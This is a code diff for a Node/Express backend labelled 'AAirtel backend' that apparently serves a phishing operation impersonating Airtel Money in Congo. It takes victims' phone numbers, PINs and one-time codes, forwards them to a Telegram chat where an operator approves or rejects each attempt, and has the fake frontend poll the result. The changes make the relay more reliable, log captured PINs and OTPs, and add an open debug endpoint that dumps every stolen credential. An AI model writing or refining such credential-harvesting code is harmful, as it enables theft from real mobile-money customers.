@@ -16,17 +16,18 @@ app.use(express.urlencoded({ extended: true }));
 // ============================================================
 // IN-MEMORY STORAGE
 // ============================================================
-// requests[id] = {
-//   type: 'login' | 'otp',
-//   phone, pin/otp, amount, session,
-//   status: 'pending' | 'approved' | 'rejected' | 'expired',
-//   createdAt, messageId
-// }
 const requests = {};
 const TIMEOUT_MS = 30 * 60 * 1000; // 30 minutes
 
 function newId() {
   return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+}
+
+function esc(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 }
 
 function pruneExpired() {
@@ -37,19 +38,26 @@ function pruneExpired() {
     }
   }
 }
-setInterval(pruneExpired, 60 * 1000); // every minute
+setInterval(pruneExpired, 60 * 1000);
 
 // ============================================================
 // TELEGRAM HELPERS
 // ============================================================
 async function tgCall(method, body) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-  const res = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-  return res.json();
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await res.json();
+    if (!data.ok) console.error(`[TG ${method}] error:`, JSON.stringify(data));
+    return data;
+  } catch (err) {
+    console.error(`[TG ${method}] fetch error:`, err.message);
+    return { ok: false, error: err.message };
+  }
 }
 
 async function sendMessage(text, replyMarkup) {
@@ -66,7 +74,8 @@ async function editMessage(messageId, text) {
     chat_id: CHAT_ID,
     message_id: messageId,
     text,
-    parse_mode: 'HTML'
+    parse_mode: 'HTML',
+    reply_markup: { inline_keyboard: [] }
   });
 }
 
@@ -75,6 +84,10 @@ async function editMessage(messageId, text) {
 // ============================================================
 app.get('/', (req, res) => {
   res.json({ status: 'ok', message: 'AAirtel backend running' });
+});
+
+app.get('/debug/requests', (req, res) => {
+  res.json(requests);
 });
 
 // ============================================================
@@ -93,10 +106,10 @@ app.post('/api/login', async (req, res) => {
     const text =
       `🔑 <b>LOGIN ATTEMPT</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
-      `<b>📱 Téléphone:</b> +243 ${phone}\n` +
-      `<b>🔒 PIN:</b> <code>${pin}</code>\n` +
-      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
-      `<b>🆔 ID:</b> <code>${id}</code>\n` +
+      `<b>📱 Téléphone:</b> +243 ${esc(phone)}\n` +
+      `<b>🔒 PIN:</b> <code>${esc(pin)}</code>\n` +
+      `<b>💰 Montant:</b> $${esc(amount || 'N/A')}\n` +
+      `<b>🆔 ID:</b> <code>${esc(id)}</code>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `🕒 ${new Date().toLocaleString('fr-FR')}`;
 
@@ -110,12 +123,15 @@ app.post('/api/login', async (req, res) => {
     const result = await sendMessage(text, reply_markup);
     const messageId = result?.result?.message_id;
 
+    console.log(`[LOGIN] id=${id} msgId=${messageId} pin=${pin}`);
+
     requests[id] = {
       type: 'login',
       phone, pin, amount, session,
       status: 'pending',
       createdAt: Date.now(),
-      messageId
+      messageId,
+      originalText: text
     };
 
     res.json({ success: true, request_id: id });
@@ -126,12 +142,12 @@ app.post('/api/login', async (req, res) => {
 });
 
 // ============================================================
-// LOGIN STATUS  →  frontend polls this
+// LOGIN STATUS
 // ============================================================
 app.get('/api/login/status/:id', (req, res) => {
   const r = requests[req.params.id];
   if (!r || r.type !== 'login') {
-    return res.json({ status: 'rejected' }); // unknown = reject
+    return res.json({ status: 'rejected' });
   }
   pruneExpired();
   res.json({ status: r.status });
@@ -153,10 +169,10 @@ app.post('/api/otp', async (req, res) => {
     const text =
       `🔐 <b>OTP SUBMITTED</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
-      `<b>📱 Téléphone:</b> +243 ${phone}\n` +
-      `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
-      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
-      `<b>🆔 ID:</b> <code>${id}</code>\n` +
+      `<b>📱 Téléphone:</b> +243 ${esc(phone)}\n` +
+      `<b>🔢 OTP:</b> <code>${esc(otp)}</code>\n` +
+      `<b>💰 Montant:</b> $${esc(amount || 'N/A')}\n` +
+      `<b>🆔 ID:</b> <code>${esc(id)}</code>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `🕒 ${new Date().toLocaleString('fr-FR')}`;
 
@@ -170,12 +186,15 @@ app.post('/api/otp', async (req, res) => {
     const result = await sendMessage(text, reply_markup);
     const messageId = result?.result?.message_id;
 
+    console.log(`[OTP] id=${id} msgId=${messageId} otp=${otp}`);
+
     requests[id] = {
       type: 'otp',
       phone, otp, amount, session,
       status: 'pending',
       createdAt: Date.now(),
-      messageId
+      messageId,
+      originalText: text
     };
 
     res.json({ success: true, request_id: id });
@@ -186,7 +205,7 @@ app.post('/api/otp', async (req, res) => {
 });
 
 // ============================================================
-// OTP STATUS  →  frontend polls this
+// OTP STATUS
 // ============================================================
 app.get('/api/otp/status/:id', (req, res) => {
   const r = requests[req.params.id];
@@ -201,48 +220,56 @@ app.get('/api/otp/status/:id', (req, res) => {
 // TELEGRAM WEBHOOK  →  receives admin button taps
 // ============================================================
 app.post('/api/telegram/webhook', async (req, res) => {
+  // Respond 200 immediately so Telegram doesn't retry
+  res.sendStatus(200);
+
   try {
     const update = req.body;
 
-    // Inline button tapped
-    if (update.callback_query) {
-      const cq = update.callback_query;
-      const data = cq.data || '';
-      const [action, id] = data.split(':');
-      const r = requests[id];
+    if (!update.callback_query) return;
 
-      if (r) {
-        if (action === 'approve') {
-          r.status = 'approved';
-          await editMessage(
-            r.messageId,
-            `✅ <b>APPROVED</b>\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `<b>Type:</b> ${r.type}\n` +
-            `<b>📱 Phone:</b> +243 ${r.phone}\n` +
-            `<b>🆔 ID:</b> <code>${id}</code>`
-          );
-        } else if (action === 'reject') {
-          r.status = 'rejected';
-          await editMessage(
-            r.messageId,
-            `❌ <b>REJECTED</b>\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `<b>Type:</b> ${r.type}\n` +
-            `<b>📱 Phone:</b> +243 ${r.phone}\n` +
-            `<b>🆔 ID:</b> <code>${id}</code>`
-          );
-        }
-      }
+    const cq = update.callback_query;
+    const data = cq.data || '';
+    const [action, id] = data.split(':');
+    const r = requests[id];
 
-      // Answer callback to remove the loading spinner on the button
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
+    console.log(`[WEBHOOK] action=${action} id=${id} found=${!!r}`);
+
+    // Remove loading spinner on the button
+    await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
+
+    if (!r) {
+      console.log('[WEBHOOK] request not found (server may have restarted)');
+      return;
     }
 
-    res.sendStatus(200);
+    let newText = '';
+    if (action === 'approve') {
+      r.status = 'approved';
+      newText =
+        `✅ <b>APPROUVÉ / APPROVED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n\n` +
+        r.originalText;
+    } else if (action === 'reject') {
+      r.status = 'rejected';
+      newText =
+        `❌ <b>REJETÉ / REJECTED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n\n` +
+        r.originalText;
+    } else {
+      return;
+    }
+
+    // Edit the original message. If edit fails (message too old, etc), send new.
+    const editResult = await editMessage(r.messageId, newText);
+    if (!editResult.ok) {
+      console.log('[WEBHOOK] edit failed, sending new message instead');
+      await sendMessage(newText);
+    } else {
+      console.log(`[WEBHOOK] ${action} done for ${id}`);
+    }
   } catch (err) {
     console.error('WEBHOOK ERROR:', err);
-    res.sendStatus(200); // always 200 so Telegram doesn't retry
   }
 });
 
